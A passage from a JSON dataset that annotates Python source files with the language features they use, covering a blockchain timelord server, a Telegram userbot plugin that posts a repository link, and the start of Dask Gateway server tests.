anymore\"\n                )\n    async def _update_proofs_count(self, challenge_weight):\n        async with self.lock:\n            if challenge_weight not in self.proof_count:\n                self.proof_count[challenge_weight] = 1\n            else:\n                self.proof_count[challenge_weight] += 1\n            if self.proof_count[challenge_weight] >= 3:\n                log.info(\"Cleaning up clients.\")\n                self.best_weight_three_proofs = max(\n                    self.best_weight_three_proofs, challenge_weight\n                )\n                for active_disc in list(self.active_discriminants):\n                    current_writer, current_weight, ip = self.active_discriminants[\n                        active_disc\n                    ]\n                    if current_weight <= challenge_weight:\n                        log.info(f\"Active weight cleanup: {current_weight}\")\n                        log.info(f\"Cleanup weight: {challenge_weight}\")\n                        self.potential_free_clients.append((ip, time.time()))\n                        current_writer.write(b\"010\")\n                        await current_writer.drain()\n                        del self.active_discriminants[active_disc]\n                        del self.active_discriminants_start_time[active_disc]\n                        self.done_discriminants.append(active_disc)\n    async def _send_iterations(self, challenge_hash, writer):\n        alive_discriminant = True\n        while alive_discriminant:\n            async with self.lock:\n                if (challenge_hash in self.active_discriminants) and (\n                    challenge_hash in self.pending_iters\n                ):\n                    if challenge_hash not in self.submitted_iters:\n                        self.submitted_iters[challenge_hash] = []\n                    for iter in sorted(self.pending_iters[challenge_hash]):\n                        if iter in self.submitted_iters[challenge_hash]:\n                            continue\n                        self.submitted_iters[challenge_hash].append(iter)\n                        if len(str(iter)) < 10:\n                            iter_size = \"0\" + str(len(str(iter)))\n                        else:\n                            iter_size = str(len(str(iter)))\n                        writer.write((iter_size + str(iter)).encode())\n                        await writer.drain()\n                        log.info(f\"New iteration submitted: {iter}\")\n            await asyncio.sleep(1)\n            async with self.lock:\n                if challenge_hash in self.done_discriminants:\n                    alive_discriminant = False\n    async def _do_process_communication(\n        self, challenge_hash, challenge_weight, ip, reader, writer\n    ):\n        disc: int = create_discriminant(\n            challenge_hash, constants[\"DISCRIMINANT_SIZE_BITS\"]\n        )\n        writer.write((str(len(str(disc))) + str(disc)).encode())\n        await writer.drain()\n        try:\n            ok = await reader.readexactly(2)\n        except (asyncio.IncompleteReadError, ConnectionResetError, Exception) as e:\n            log.warning(f\"{type(e)} {e}\")\n            async with self.lock:\n                if challenge_hash not in self.done_discriminants:\n                    self.done_discriminants.append(challenge_hash)\n            return\n        if ok.decode() != \"OK\":\n            return\n        log.info(\"Got handshake with VDF client.\")\n        async with self.lock:\n            self.active_discriminants[challenge_hash] = (writer, challenge_weight, ip)\n            self.active_discriminants_start_time[challenge_hash] = time.time()\n        asyncio.create_task(self._send_iterations(challenge_hash, writer))\n        while True:\n            try:\n                data = await reader.readexactly(4)\n            except (asyncio.IncompleteReadError, ConnectionResetError, Exception) as e:\n                log.warning(f\"{type(e)} {e}\")\n                async with self.lock:\n                    if challenge_hash in self.active_discriminants:\n                        del self.active_discriminants[challenge_hash]\n                    if challenge_hash in self.active_discriminants_start_time:\n                        del self.active_discriminants_start_time[challenge_hash]\n                    if challenge_hash not in self.done_discriminants:\n                        self.done_discriminants.append(challenge_hash)\n                break\n            if data.decode() == \"STOP\":\n                log.info(f\"Stopped client running on ip {ip}.\")\n                async with self.lock:\n                    writer.write(b\"ACK\")\n                    await writer.drain()\n                break\n            else:\n                try:\n                    proof = await reader.readexactly(1860)\n                    stdout_bytes_io: io.BytesIO = io.BytesIO(\n                        bytes.fromhex(data.decode() + proof.decode())\n                    )\n                except (asyncio.IncompleteReadError, ConnectionResetError, Exception) as e:\n                    log.warning(f\"{type(e)} {e}\")\n                    async with self.lock:\n                        if challenge_hash in self.active_discriminants:\n                            del self.active_discriminants[challenge_hash]\n                        if challenge_hash in self.active_discriminants_start_time:\n                            del self.active_discriminants_start_time[challenge_hash]\n                        if challenge_hash not in self.done_discriminants:\n                            self.done_discriminants.append(challenge_hash)\n                    break\n                iterations_needed = uint64(\n                    int.from_bytes(stdout_bytes_io.read(8), \"big\", signed=True)\n                )\n                y = ClassgroupElement.parse(stdout_bytes_io)\n                proof_bytes: bytes = stdout_bytes_io.read()\n                proof_blob = (\n                    ClassGroup.from_ab_discriminant(y.a, y.b, disc).serialize()\n                    + proof_bytes\n                )\n                x = ClassGroup.from_ab_discriminant(2, 1, disc)\n                if not check_proof_of_time_nwesolowski(\n                    disc,\n                    x,\n                    proof_blob,\n                    iterations_needed,\n                    constants[\"DISCRIMINANT_SIZE_BITS\"],\n                    self.config[\"n_wesolowski\"],\n                ):\n                    log.error(\"My proof is incorrect!\")\n                output = ClassgroupElement(y.a, y.b)\n                proof_of_time = ProofOfTime(\n                    challenge_hash,\n                    iterations_needed,\n                    output,\n                    self.config[\"n_wesolowski\"],\n                    [uint8(b) for b in proof_bytes],\n                )\n                response = timelord_protocol.ProofOfTimeFinished(proof_of_time)\n                await self._update_avg_ips(challenge_hash, iterations_needed, ip)\n                async with self.lock:\n                    self.proofs_to_write.append(\n                        OutboundMessage(\n                            NodeType.FULL_NODE,\n                            Message(\"proof_of_time_finished\", response),\n                            Delivery.BROADCAST,\n                        )\n                    )\n                await self._update_proofs_count(challenge_weight)\n    async def _manage_discriminant_queue(self):\n        while not self._is_shutdown:\n            async with self.lock:\n                if len(self.discriminant_queue) > 0:\n                    max_weight = max([h for _, h in self.discriminant_queue])\n                    if max_weight <= self.best_weight_three_proofs:\n                        self.done_discriminants.extend(\n                            [d for d, _ in self.discriminant_queue]\n                        )\n                        self.discriminant_queue.clear()\n                    else:\n                        max_weight_disc = [\n                            d for d, h in self.discriminant_queue if h == max_weight\n                        ]\n                        with_iters = [\n                            d\n                            for d in max_weight_disc\n                            if d in self.pending_iters\n                            and len(self.pending_iters[d]) != 0\n                        ]\n                        if len(with_iters) == 0:\n                            disc = max_weight_disc[0]\n                        else:\n                            min_iter = min(\n                                [min(self.pending_iters[d]) for d in with_iters]\n                            )\n                            disc = next(\n                                d\n                                for d in with_iters\n                                if min(self.pending_iters[d]) == min_iter\n                            )\n                        if len(self.free_clients) != 0:\n                            ip, sr, sw = self.free_clients[0]\n                            self.free_clients = self.free_clients[1:]\n                            self.discriminant_queue.remove((disc, max_weight))\n                            asyncio.create_task(\n                                self._do_process_communication(\n                                    disc, max_weight, ip, sr, sw\n                                )\n                            )\n                        else:\n                            self.potential_free_clients = [\n                                (ip, end_time)\n                                for ip, end_time\n                                in self.potential_free_clients\n                                if time.time() < end_time + self.max_connection_time\n                            ]\n                            if (\n                                len(self.potential_free_clients) == 0\n                                and len(self.active_discriminants) > 0\n                            ):\n                                worst_weight_active = min(\n                                    [\n                                        h\n                                        for (\n                                            _,\n                                            h,\n                                            _,\n                                        ) in self.active_discriminants.values()\n                                    ]\n                                )\n                                if max_weight > worst_weight_active:\n                                    await self._stop_worst_process(worst_weight_active)\n                                elif max_weight == worst_weight_active:\n                                    if (\n                                        disc in self.pending_iters\n                                        and len(self.pending_iters[disc]) != 0\n                                    ):\n                                        if any(\n                                            (\n                                                k not in self.pending_iters\n                                                or len(self.pending_iters[k]) == 0\n                                            )\n                                            for k, v in self.active_discriminants.items()\n                                            if v[1] == worst_weight_active\n                                        ):\n                                            log.info(\n                                                \"Stopped process without iters for one with iters.\"\n                                            )\n                                            await self._stop_worst_process(\n                                                worst_weight_active\n                                            )\n                if len(self.proofs_to_write) > 0:\n                    for msg in self.proofs_to_write:\n                        yield msg\n                    self.proofs_to_write.clear()\n            await asyncio.sleep(0.5)\n    @api_request\n    async def challenge_start(self, challenge_start: timelord_protocol.ChallengeStart):\n        async with self.lock:\n            if challenge_start.challenge_hash in self.seen_discriminants:\n                log.info(\n                    f\"Have already seen this challenge hash {challenge_start.challenge_hash}. Ignoring.\"\n                )\n                return\n            if challenge_start.weight <= self.best_weight_three_proofs:\n                log.info(\"Not starting challenge, already three proofs at that weight\")\n                return\n            self.seen_discriminants.append(challenge_start.challenge_hash)\n            self.discriminant_queue.append(\n                (challenge_start.challenge_hash, challenge_start.weight)\n            )\n            log.info(\"Appended to discriminant queue.\")\n    @api_request\n    async def proof_of_space_info(\n        self, proof_of_space_info: timelord_protocol.ProofOfSpaceInfo\n    ):\n        async with self.lock:\n            log.info(\n                f\"proof_of_space_info {proof_of_space_info.challenge_hash} {proof_of_space_info.iterations_needed}\"\n            )\n            if proof_of_space_info.challenge_hash in self.done_discriminants:\n                log.info(\n                    f\"proof_of_space_info {proof_of_space_info.challenge_hash} already done, returning\"\n                )\n                return\n            if proof_of_space_info.challenge_hash not in self.pending_iters:\n                self.pending_iters[proof_of_space_info.challenge_hash] = []\n            if proof_of_space_info.challenge_hash not in self.submitted_iters:\n                self.submitted_iters[proof_of_space_info.challenge_hash] = []\n            if (\n                proof_of_space_info.iterations_needed\n                not in self.pending_iters[proof_of_space_info.challenge_hash]\n                and proof_of_space_info.iterations_needed\n                not in self.submitted_iters[proof_of_space_info.challenge_hash]\n            ):\n                log.info(\n                    f\"proof_of_space_info {proof_of_space_info.challenge_hash} adding \"\n                    f\"{proof_of_space_info.iterations_needed} to \"\n                    f\"{self.pending_iters[proof_of_space_info.challenge_hash]}\"\n                )\n                self.pending_iters[proof_of_space_info.challenge_hash].append(\n                    proof_of_space_info.iterations_needed\n                )",
            "patterns": {
                "pep_526": [
                    [
                        21,
                        "self.config: Dict = config"
                    ],
                    [
                        31,
                        "self.lock: Lock = Lock()"
                    ],
                    [
                        32,
                        "self.active_discriminants: Dict[bytes32, Tuple[StreamWriter, uint64, str]] = {}"
                    ],
                    [
                        33,
                        "self.best_weight_three_proofs: int = -1"
                    ],
                    [
                        34,
                        "self.active_discriminants_start_time: Dict = {}"
                    ],
                    [
                        35,
                        "self.pending_iters: Dict = {}"
                    ],
                    [
                        36,
                        "self.submitted_iters: Dict = {}"
                    ],
                    [
                        37,
                        "self.done_discriminants: List[bytes32] = []"
                    ],
                    [
                        38,
                        "self.proofs_to_write: List[OutboundMessage] = []"
                    ],
                    [
                        39,
                        "self.seen_discriminants: List[bytes32] = []"
                    ],
                    [
                        40,
                        "self.proof_count: Dict = {}"
                    ],
                    [
                        41,
                        "self.avg_ips: Dict = {}"
                    ],
                    [
                        42,
                        "self.discriminant_queue: List[Tuple[bytes32, uint64]] = []"
                    ],
                    [
                        44,
                        "self.potential_free_clients: List = []"
                    ],
                    [
                        45,
                        "self.free_clients: List[Tuple[str, StreamReader, StreamWriter]] = []"
                    ],
                    [
                        72,
                        "stop_writer: Optional[StreamWriter] = None"
                    ],
                    [
                        73,
                        "stop_discriminant: Optional[bytes32] = None"
                    ],
                    [
                        201,
                        "disc: int = create_discriminant("
                    ],
                    [
                        260,
                        "proof_bytes: bytes = stdout_bytes_io.read()"
                    ],
                    [
                        243,
                        "stdout_bytes_io: io.BytesIO = io.BytesIO("
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ],
                    [
                        5,
                        5,
                        "import",
                        "from asyncio import Lock, StreamReader, StreamWriter"
                    ]
                ],
                "pep_585": [
                    [
                        6,
                        "from typing import Dict, List, Optional, Tuple",
                        "suggestion"
                    ],
                    [
                        6,
                        "from typing import Dict, List, Optional, Tuple",
                        "suggestion"
                    ],
                    [
                        6,
                        "from typing import Dict, List, Optional, Tuple",
                        "suggestion"
                    ]
                ],
                "pep_585v": [
                    [
                        32,
                        "        self.active_discriminants: Dict[bytes32, Tuple[StreamWriter, uint64, str]] = {}",
                        "violation"
                    ],
                    [
                        37,
                        "        self.done_discriminants: List[bytes32] = []",
                        "violation"
                    ],
                    [
                        38,
                        "        self.proofs_to_write: List[OutboundMessage] = []",
                        "violation"
                    ],
                    [
                        39,
                        "        self.seen_discriminants: List[bytes32] = []",
                        "violation"
                    ],
                    [
                        42,
                        "        self.discriminant_queue: List[Tuple[bytes32, uint64]] = []",
                        "violation"
                    ],
                    [
                        45,
                        "        self.free_clients: List[Tuple[str, StreamReader, StreamWriter]] = []",
                        "violation"
                    ]
                ],
                "pep_525": [
                    [
                        294,
                        380,
                        "async generator",
                        "async def _manage_discriminant_queue(self):\n        while not self._is_shutdown:\n            async with self.lock:\n                if len(self.discriminant_queue) > 0:\n                    max_weight = max([h for _, h in self.discriminant_queue])\n                    if max_weight <= self.best_weight_three_proofs:\n                        self.done_discriminants.extend(\n                            [d for d, _ in self.discriminant_queue]\n                        )\n                        self.discriminant_queue.clear()\n                    else:\n                        max_weight_disc = [\n                            d for d, h in self.discriminant_queue if h == max_weight\n                        ]\n                        with_iters = [\n                            d\n                            for d in max_weight_disc\n                            if d in self.pending_iters\n                            and len(self.pending_iters[d]) != 0\n                        ]\n                        if len(with_iters) == 0:\n                            disc = max_weight_disc[0]\n                        else:\n                            min_iter = min(\n                                [min(self.pending_iters[d]) for d in with_iters]\n                            )\n                            disc = next(\n                                d\n                                for d in with_iters\n                                if min(self.pending_iters[d]) == min_iter\n                            )\n                        if len(self.free_clients) != 0:\n                            ip, sr, sw = self.free_clients[0]\n                            self.free_clients = self.free_clients[1:]\n                            self.discriminant_queue.remove((disc, max_weight))\n                            asyncio.create_task(\n                                self._do_process_communication(\n                                    disc, max_weight, ip, sr, sw\n                                )\n                            )\n                        else:\n                            self.potential_free_clients = [\n                                (ip, end_time)\n                                for ip, end_time\n                                in self.potential_free_clients\n                                if time.time() < end_time + self.max_connection_time\n                            ]\n                            if (\n                                len(self.potential_free_clients) == 0\n                                and len(self.active_discriminants) > 0\n                            ):\n                                worst_weight_active = min(\n                                    [\n                                        h\n                                        for (\n                                            _,\n                                            h,\n                                            _,\n                                        ) in self.active_discriminants.values()\n                                    ]\n                                )\n                                if max_weight > worst_weight_active:\n                                    await self._stop_worst_process(worst_weight_active)\n                                elif max_weight == worst_weight_active:\n                                    if (\n                                        disc in self.pending_iters\n                                        and len(self.pending_iters[disc]) != 0\n                                    ):\n                                        if any(\n                                            (\n                                                k not in self.pending_iters\n                                                or len(self.pending_iters[k]) == 0\n                                            )\n                                            for k, v in self.active_discriminants.items()\n                                            if v[1] == worst_weight_active\n                                        ):\n                                            log.info(\n                                                \"Stopped process without iters for one with iters.\"\n                                            )\n                                            await self._stop_worst_process(\n                                                worst_weight_active\n                                            )\n                if len(self.proofs_to_write) > 0:\n                    for msg in self.proofs_to_write:\n                        yield msg\n                    self.proofs_to_write.clear()\n            await asyncio.sleep(0.5)"
                    ]
                ],
                "pep_498": [
                    [
                        71,
                        "        log.info(f\"Stopping one process at weight {worst_weight_active}\")"
                    ],
                    [
                        50,
                        "            log.info(f\"New timelord connection from client: {client_ip}.\")"
                    ],
                    [
                        112,
                        "            log.info(f\"Worst finish time: {worst_finish}s\")"
                    ],
                    [
                        403,
                        "                f\"proof_of_space_info {proof_of_space_info.challenge_hash} {proof_of_space_info.iterations_needed}\""
                    ],
                    [
                        53,
                        "                log.info(f\"Added new VDF client {client_ip}.\")"
                    ],
                    [
                        134,
                        "                    f\"Finished PoT, chall:{challenge_hash[:10].hex()}..\""
                    ],
                    [
                        147,
                        "                    f\"Finished PoT chall:{challenge_hash[:10].hex()}.. {iterations_needed}\""
                    ],
                    [
                        209,
                        "            log.warning(f\"{type(e)} {e}\")"
                    ],
                    [
                        235,
                        "                log.info(f\"Stopped client running on ip {ip}.\")"
                    ],
                    [
                        386,
                        "                    f\"Have already seen this challenge hash {challenge_start.challenge_hash}. Ignoring.\""
                    ],
                    [
                        407,
                        "                    f\"proof_of_space_info {proof_of_space_info.challenge_hash} already done, returning\""
                    ],
                    [
                        421,
                        "                    f\"proof_of_space_info {proof_of_space_info.challenge_hash} adding \""
                    ],
                    [
                        143,
                        "                    log.info(f\"New estimate: {new_avg_ips}\")"
                    ],
                    [
                        225,
                        "                log.warning(f\"{type(e)} {e}\")"
                    ],
                    [
                        166,
                        "                        log.info(f\"Active weight cleanup: {current_weight}\")"
                    ],
                    [
                        167,
                        "                        log.info(f\"Cleanup weight: {challenge_weight}\")"
                    ],
                    [
                        193,
                        "                        log.info(f\"New iteration submitted: {iter}\")"
                    ],
                    [
                        247,
                        "                    log.warning(f\"{type(e)} {e}\")"
                    ]
                ]
            }
        },
        "171": {
            "file": "import asyncio\nfrom telethon import events\nfrom telethon.tl.types import ChannelParticipantsAdmins\nfrom uniborg.util import admin_cmd\n@borg.on(admin_cmd(\"repo\"))\nasync def _(event):\n    if event.fwd_from:\n        return\n    mentions = \"**Link To The Custom Forked Repo:** https://github.com/prono69/PornHub/ \"\n    chat = await event.get_input_chat()\n    async for x in borg.iter_participants(chat, filter=ChannelParticipantsAdmins):\n        mentions += f\"\"\n    reply_message = None\n    if event.reply_to_msg_id:\n        reply_message = await event.get_reply_message()\n        await reply_message.reply(mentions)\n    else:\n        await event.reply(mentions)\n    await event.delete()",
            "patterns": {
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        11,
                        12,
                        "async for",
                        "async for x in borg.iter_participants(chat, filter=ChannelParticipantsAdmins):\n        mentions += f\"\""
                    ]
                ],
                "pep_498": [
                    [
                        12,
                        "        mentions += f\"\""
                    ]
                ]
            }
        },
        "172": {
            "file": "import asyncio\nimport os\nimport socket\nimport signal\nimport time\nimport pytest\nfrom cryptography.fernet import Fernet\nfrom traitlets import Integer, Float\nfrom traitlets.config import Config\nimport dask\nfrom dask_gateway import Gateway, GatewayClusterError, GatewayWarning, GatewayCluster\nfrom dask_gateway_server.app import DaskGateway\nfrom dask_gateway_server.compat import get_running_loop\nfrom dask_gateway_server.objects import ClusterStatus\nfrom dask_gateway_server.managers import ClusterManager\nfrom dask_gateway_server.managers.inprocess import InProcessClusterManager\nfrom dask_gateway_server import options\nfrom .utils import LocalTestingClusterManager, temp_gateway\n@pytest.fixture(autouse=True)\ndef ensure_clusters_closed():\n    instances = len(GatewayCluster._instances)\n    for c in list(GatewayCluster._instances):\n        if not c.asynchronous:\n            c.close()\n    assert instances == 0\nclass SlowStartClusterManager(ClusterManager):\n    pause_time = Float(0.2, config=True)\n    state_1 = {\"state_1\": 1}\n    state_2 = {\"state_2\": 2}\n    state_3 = {\"state_3\": 3}\n    stop_cluster_state = None\n    running = False\n    async def start_cluster(self):\n        self.running = True\n        yield self.state_1\n        await asyncio.sleep(self.pause_time)\n        yield self.state_2\n        await asyncio.sleep(self.pause_time)\n        yield self.state_3\n    async def cluster_status(self, cluster_state):\n        return self.running\n    async def stop_cluster(self, cluster_state):\n        self.stop_cluster_state = cluster_state\n        self.running = False\nclass ClusterFailsDuringStart(ClusterManager):\n    fail_stage = Integer(1, config=True)\n    stop_cluster_state = None\n    async def start_cluster(self):\n        for i in range(3):\n            if i == self.fail_stage:\n                raise ValueError(\"Oh No\")\n            yield {\"i\": i}\n    async def stop_cluster(self, cluster_state):\n        self.stop_cluster_state = cluster_state\nclass ClusterFailsBetweenStartAndConnect(InProcessClusterManager):\n    status = \"starting\"\n    async def start_cluster(self):\n        yield {\"foo\": \"bar\"}\n        self.status = \"failed\"\n    async def cluster_status(self, cluster_state):\n        return self.status not in (\"failed\", \"stopped\")\n    async def stop_cluster(self, cluster_state):\n        self.status = \"stopped\"\nclass ClusterFailsAfterConnect(InProcessClusterManager):\n    fail_after = 0.5\n    async def start_cluster(self):\n        loop = get_running_loop()\n        self.failed = loop.create_future()\n        self.stop_cluster_called = loop.create_future()\n        async for state in super().start_cluster():\n            yield state\n        self.task_pool.create_task(self.delay_fail_cluster())\n    async def delay_fail_cluster(self):\n        await asyncio.sleep(self.fail_after)\n        self.failed.set_result(True)\n    async def cluster_status(self, cluster_state):\n        if self.failed.done():\n            return False\n        return await super().cluster_status(cluster_state)\n    async def stop_cluster(self, cluster_state):\n        await super().stop_cluster(cluster_state)\n        self.stop_cluster_called.set_result(True)\nclass SlowWorkerStartClusterManager(InProcessClusterManager):\n    pause_time = Float(0.2, config=True)\n    stop_worker_state = None\n    async def start_worker(self, worker_name, cluster_state):\n        for i in range(3):\n            yield {\"i\": i}\n            await asyncio.sleep(self.pause_time)\n        self.workers[worker_name] = None\n    async def worker_status(self, worker_name, worker_state, cluster_state):\n        return worker_name in self.workers\n    async def stop_worker(self, worker_name, worker_state, cluster_state):\n        self.stop_worker_state = worker_state\n        self.workers.pop(worker_name, None)\nclass WorkerFailsDuringStart(InProcessClusterManager):\n    fail_stage = Integer(1, config=True)\n    stop_worker_state = None\n    async def start_worker(self, worker_name, cluster_state):\n        for i in range(3):\n            if i == self.fail_stage:\n                raise ValueError(\"Oh No\")\n            yield {\"i\": i}\n    async def stop_worker(self, worker_name, worker_state, cluster_state):\n        self.stop_worker_state = worker_state\nclass WorkerFailsBetweenStartAndConnect(InProcessClusterManager):\n    status = \"starting\"\n    async def start_worker(self, worker_name, cluster_state):\n        yield {\"foo\": \"bar\"}\n        self.status = \"failed\"\n    async def worker_status(self, worker_name, worker_state, cluster_state):\n        return self.status not in (\"failed\", \"stopped\")\n    async def stop_worker(self, worker_name, worker_state, cluster_state):\n        self.status = \"stopped\"\nclass WorkerFailsAfterConnect(InProcessClusterManager):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        loop = get_running_loop()\n        self.stop_worker_called = loop.create_future()\n        self.worker_connected = loop.create_future()\n    def on_worker_running(self, *args, **kwargs):\n        self.worker_connected.set_result(True)\n    async def stop_worker(self, *args, **kwargs):\n        await super().stop_worker(*args, **kwargs)\n        if not self.stop_worker_called.done():\n            self.stop_worker_called.set_result(True)\n@pytest.mark.asyncio\nasync def test_shutdown_on_startup_error(tmpdir):\n    gateway = DaskGateway(\n        gateway_url=\"tls://127.0.0.1:0\",\n        private_url=\"http://127.0.0.1:0\",\n        public_url=\"http://127.0.0.1:0\",\n        temp_dir=str(tmpdir),\n        tls_cert=str(tmpdir.join(\"tls_cert.pem\")),\n        authenticator_class=\"dask_gateway_server.auth.DummyAuthenticator\",\n    )\n    with pytest.raises(SystemExit) as exc:\n        gateway.initialize([])\n        await gateway.start_or_exit()\n    assert exc.value.code == 1\ndef test_db_encrypt_keys_required(tmpdir):\n    with pytest.raises(ValueError) as exc:\n        gateway = DaskGateway(\n            gateway_url=\"tls://127.0.0.1:0\",\n            private_url=\"http://127.0.0.1:0\",\n            public_url=\"http://127.0.0.1:0\",\n            temp_dir=str(tmpdir),\n            db_url=\"sqlite:///%s\" % tmpdir.join(\"dask_gateway.sqlite\"),\n            authenticator_class=\"dask_gateway_server.auth.DummyAuthenticator\",\n        )\n        gateway.initialize([])\n    assert \"DASK_GATEWAY_ENCRYPT_KEYS\" in str(exc.value)\ndef test_db_encrypt_keys_invalid(tmpdir):\n    with pytest.raises(ValueError) as exc:\n        gateway = DaskGateway(\n            gateway_url=\"tls://127.0.0.1:0\",\n            private_url=\"http://127.0.0.1:0\",\n            public_url=\"http://127.0.0.1:0\",\n            temp_dir=str(tmpdir),\n            db_url=\"sqlite:///%s\" % tmpdir.join(\"dask_gateway.sqlite\"),\n            db_encrypt_keys=[\"abc\"],\n            authenticator_class=\"dask_gateway_server.auth.DummyAuthenticator\",\n        )\n        gateway.initialize([])\n    assert \"DASK_GATEWAY_ENCRYPT_KEYS\" in str(exc.value)\ndef test_db_decrypt_keys_from_env(monkeypatch):\n    keys = [Fernet.generate_key(), Fernet.generate_key()]\n    val = b\";\".join(keys).decode()\n    monkeypatch.setenv(\"DASK_GATEWAY_ENCRYPT_KEYS\", val)\n    gateway = DaskGateway()\n    assert gateway.db_encrypt_keys == keys\ndef test_resume_clusters_forbid_in_memory_db(tmpdir):\n    with pytest.raises(ValueError) as exc:\n        DaskGateway(\n            gateway_url=\"tls://127.0.0.1:0\",\n            private_url=\"http://127.0.0.1:0\",\n            public_url=\"http://127.0.0.1:0\",\n            temp_dir=str(tmpdir),\n            db_url=\"sqlite://\",\n            stop_clusters_on_shutdown=False,\n            authenticator_class=\"dask_gateway_server.auth.DummyAuthenticator\",\n        )\n    assert \"stop_clusters_on_shutdown\" in str(exc.value)\ndef test_default_urls_from_config():\n    hostname = socket.gethostname()\n    gateway = DaskGateway()\n    gateway.init_server_urls()\n    assert gateway.public_urls.bind_host == \"\"\n    assert gateway.public_urls.connect.hostname == hostname\n    assert gateway.gateway_urls.bind.scheme == \"tls\"\n    assert gateway.gateway_urls.bind_host == \"\"\n    assert gateway.gateway_urls.connect.hostname == hostname\n    assert gateway.private_urls.bind_port != 0\n@pytest.mark.asyncio\n@pytest.mark.parametrize(\"start_timeout,state\", [(0.1, \"state_1\"), (0.25, \"state_2\")])\nasync def test_slow_cluster_start(tmpdir, start_timeout, state):\n    config = Config()\n    config.DaskGateway.cluster_manager_class = SlowStartClusterManager\n    config.DaskGateway.temp_dir = str(tmpdir)\n    config.SlowStartClusterManager.cluster_start_timeout = start_timeout\n    async with temp_gateway(config=config) as gateway_proc:\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            cluster_id = await gateway.submit()\n            with pytest.raises(GatewayClusterError) as exc:\n                async with gateway.connect(cluster_id):\n                    pass\n            assert cluster_id in str(exc.value)\n            cluster = gateway_proc.db.cluster_from_name(cluster_id)\n            res = getattr(cluster.manager, state)\n            assert cluster.manager.stop_cluster_state == res\n@pytest.mark.asyncio\nasync def test_slow_cluster_connect(tmpdir):\n    config = Config()\n    config.DaskGateway.cluster_manager_class = SlowStartClusterManager\n    config.DaskGateway.temp_dir = str(tmpdir)\n    config.SlowStartClusterManager.cluster_start_timeout = 0.1\n    config.SlowStartClusterManager.pause_time = 0\n    async with temp_gateway(config=config) as gateway_proc:\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            cluster_id = await gateway.submit()\n            with pytest.raises(GatewayClusterError) as exc:\n                async with gateway.connect(cluster_id):\n                    pass\n            assert cluster_id in str(exc.value)\n            cluster = gateway_proc.db.cluster_from_name(cluster_id)\n            res = cluster.manager.state_3\n            assert cluster.manager.stop_cluster_state == res\n@pytest.mark.asyncio\n@pytest.mark.parametrize(\"fail_stage\", [0, 1])\nasync def test_cluster_fails_during_start(tmpdir, fail_stage):\n    config = Config()\n    config.DaskGateway.cluster_manager_class = ClusterFailsDuringStart\n    config.DaskGateway.temp_dir = str(tmpdir)\n    config.ClusterFailsDuringStart.fail_stage = fail_stage\n    async with temp_gateway(config=config) as gateway_proc:\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            cluster_id = await gateway.submit()\n            with pytest.raises(GatewayClusterError) as exc:\n                async with gateway.connect(cluster_id):\n                    pass\n            assert cluster_id in str(exc.value)\n            cluster_obj = gateway_proc.db.cluster_from_name(cluster_id)\n            res = {} if fail_stage == 0 else {\"i\": fail_stage - 1}\n            assert cluster_obj.manager.stop_cluster_state == res\n@pytest.mark.asyncio\nasync def test_cluster_fails_between_start_and_connect(tmpdir):\n    config = Config()\n    config.DaskGateway.cluster_manager_class = ClusterFailsBetweenStartAndConnect\n    config.DaskGateway.temp_dir = str(tmpdir)\n    config.ClusterFailsBetweenStartAndConnect.cluster_status_period = 0.1\n    async with temp_gateway(config=config) as gateway_proc:\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            cluster_id = await gateway.submit()\n            cluster_obj = gateway_proc.db.cluster_from_name(cluster_id)\n            with pytest.raises(GatewayClusterError) as exc:\n                await asyncio.wait_for(gateway.connect(cluster_id), 5)\n            assert cluster_id in str(exc.value)\n            assert \"failed to start\" in str(exc.value)\n            assert cluster_obj.manager.status == \"stopped\"\n@pytest.mark.asyncio\nasync def test_cluster_fails_after_connect(tmpdir):\n    config = Config()\n    config.DaskGateway.cluster_manager_class = ClusterFailsAfterConnect\n    config.DaskGateway.temp_dir = str(tmpdir)\n    config.ClusterFailsAfterConnect.cluster_status_period = 0.25\n    async with temp_gateway(config=config) as gateway_proc:\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            cluster_id = await gateway.submit()\n            cluster_obj = gateway_proc.db.cluster_from_name(cluster_id)\n            async with gateway.connect(cluster_id):\n                await asyncio.wait_for(cluster_obj.manager.failed, 3)\n                await asyncio.wait_for(cluster_obj.manager.stop_cluster_called, 3)\n@pytest.mark.asyncio\n@pytest.mark.parametrize(\"start_timeout,state\", [(0.1, 0), (0.25, 1)])\nasync def test_slow_worker_start(tmpdir, start_timeout, state):\n    config = Config()\n    config.DaskGateway.cluster_manager_class = SlowWorkerStartClusterManager\n    config.DaskGateway.temp_dir = str(tmpdir)\n    config.SlowWorkerStartClusterManager.worker_start_timeout = start_timeout\n    async with temp_gateway(config=config) as gateway_proc:\n        async with Gateway(\n            address=gateway_proc.public_urls.connect_url,\n            proxy_address=gateway_proc.gateway_urls.connect_url,\n            asynchronous=True,\n        ) as gateway:\n            cluster = await gateway.new_cluster()\n            await cluster.scale(1)\n            cluster_obj = gateway_proc.db.cluster_from_name(cluster.name)\n            timeout = 5\n            while timeout > 0:\n                if cluster_obj.manager.stop_worker_state is not None:\n                    break\n                await asyncio.sleep(0.1)\n                timeout -= 0.1\n            else:\n                assert False, \"Operation timed out\"\n            assert cluster_obj.manager.stop_worker_state == {\"i\": state}\n            await cluster.shutdown()\n@pytest.mark.asyncio\nasync def test_slow_worker_connect(tmpdir):\n    config = Config()\n    config.DaskGateway.cluster_manager_class = SlowWorkerStartClusterManager\n    config.DaskGateway.temp_dir = str(tmpdir)\n    config.SlowWorkerStartClusterManager.worker_start_timeout = 0.1\n    config.SlowWorkerStartClusterManager.pause_time = 0\n    async with temp_gateway(config=config) as gateway_proc:\n        async with Gateway(\n            